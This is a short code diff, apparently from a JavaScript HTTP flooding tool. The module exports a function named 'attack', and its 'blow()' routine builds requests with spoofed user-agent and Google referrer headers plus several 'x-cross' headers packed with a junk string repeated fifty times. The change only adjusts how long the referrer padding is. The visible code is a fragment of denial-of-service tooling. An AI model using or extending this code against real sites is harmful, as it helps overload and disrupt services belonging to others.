@@ -21,7 +21,7 @@ blow() {
   var headers = {
   'user-agent':getUserAgent(),
   'Content-Type':'application/x-www-form-urlencoded',
-  'referrer':'https://www.google.com/q='+getH(),
+  'referrer':'https://www.google.com/q='+getH(1),
   'x-cross-1':getH(),
   'x-cross-2':getH(),
   'x-cross-3':getH(),
@@ -81,8 +81,8 @@ function getUserAgent() {
 }
 
 
-function getH() {
-  return ('2467zzasSSSLlKKFKKHKHKGKKK9596999').repeat(50);
+function getH(n) {
+  return ('2467zzasSSSLlKKFKKHKHKGKKK9596999').repeat(n || 50);
 }
 
 module.exports = attack;
